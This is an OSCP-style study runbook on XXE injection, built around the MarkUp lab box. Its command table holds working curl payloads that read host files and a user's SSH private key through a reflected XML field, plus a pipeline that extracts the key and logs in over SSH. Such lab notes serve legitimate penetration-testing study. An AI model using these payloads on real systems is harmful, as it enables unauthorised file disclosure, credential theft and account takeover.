---
tags: [oscp, web-app, xxe, runbook]
box_sources: [MarkUp]
---

# Web App - XXE (XML External Entity Injection)

*An application parses attacker-controlled XML. An external entity is a named XML value that can load data from a local file or remote URL. If the parser allows it, the application may disclose files from its own host.*

---

| Command | Evidence | Works when | Notes | ✅ Go to | ❌ If nothing works |
|---|---|---|---|---|---|
| `curl -s -b "$CookieFile" -H 'Content-Type: text/xml' --data-raw '<?xml version="1.0"?><order><quantity>1</quantity><item>TESTVALUE</item><address>test</address></order>' "http://$BoxIP:$WebPort/process.php"` | `TESTVALUE` appears in the response | The endpoint accepts raw XML and reflects a field | Establish the normal response before adding a DTD. Use the real endpoint and field names from page source or Burp Repeater. | Test a harmless entity | [[HTTP - Initial Recon]] |
| `curl -s -b "$CookieFile" -H 'Content-Type: text/xml' --data-raw '<?xml version="1.0"?><!DOCTYPE order [<!ENTITY xxe "HELLO">]><order><quantity>1</quantity><item>&xxe;</item><address>test</address></order>' "http://$BoxIP:$WebPort/process.php"` | `HELLO` appears in the response | The parser resolves internal entities | This confirms entity expansion without reading a file. Put `&xxe;` in the field that reflected during the baseline test. | Read a safe local file | [[Web App - XXE]] |
| `curl -s -b "$CookieFile" -H 'Content-Type: text/xml' --data-raw '<?xml version="1.0"?><!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><order><quantity>1</quantity><item>&xxe;</item><address>test</address></order>' "http://$BoxIP:$WebPort/process.php"` | Windows hosts-file text appears | External entities are enabled and the file is readable | Use a known-safe file first. On Linux, try `file:///etc/passwd`. On Windows, use the `file:///C:/...` form. | Read configuration or key files | [[Web Applications (Decision Tree)]] |
| `curl -s -b "$CookieFile" -H 'Content-Type: text/xml' --data-raw '<?xml version="1.0"?><!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///C:/Users/$Username/.ssh/id_rsa">]><order><quantity>1</quantity><item>&xxe;</item><address>test</address></order>' "http://$BoxIP:$WebPort/process.php"` | Private-key PEM markers appear | A target user has an SSH key and the web process can read it | Save the response to a file. Do not copy a multiline key by hand. | [[SSH - Initial]] or mechanical key validation | Try source disclosure or another readable user file |
| `awk '/BEGIN OPENSSH PRIVATE KEY/,/END OPENSSH PRIVATE KEY/' "$ResponseFile" | sed -e 's/^.*\(-----BEGIN OPENSSH PRIVATE KEY-----\)/\1/' -e 's/\(-----END OPENSSH PRIVATE KEY-----\).*/\1/' > "$KeyFile"; chmod 600 "$KeyFile"; ssh-keygen -y -f "$KeyFile"` | `ssh-keygen -y` prints a public key | A multiline key was returned inside an HTML or text wrapper | Mechanical extraction avoids lost characters and invisible terminal formatting. | `ssh -i "$KeyFile" $Username@$BoxIP` | Check the response prefix, line endings, and PEM markers |

## MarkUp Example

The authenticated order endpoint accepts `Content-Type: text/xml`, constructs an XML order, and reflects the `<item>` value. A harmless `HELLO` entity confirms the parser. The Windows hosts file is the safe file-read check. The same reflected field can then disclose `C:\Users\$Username\.ssh\id_rsa`.

## Troubleshooting

- No reflection: identify which XML element appears in the response and place `&xxe;` there.
- Entity text works but file reads fail: external entities may be disabled, the path may be wrong, or the web user may lack read permission.
- A key fails with `error in libcrypto`: extract it mechanically and check the PEM markers. Terminal wrapping is not necessarily a real newline.
- No response body contains the file: use an external DTD and an out-of-band HTTP callback. Watch the `$WebPort` server log for the DTD request.

## Module Links

[[09. Common Web Application Attacks|Common Web Application Attacks]]

## External Resources

- [HackTricks - XXE](https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html)
- [PayloadsAllTheThings - XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [PortSwigger - XXE](https://portswigger.net/web-security/xxe)
- [CyberChef](https://gchq.github.io/CyberChef/) for decoding returned base64 data
- [ippsec.rocks - XXE search](https://ippsec.rocks/?#xxe)
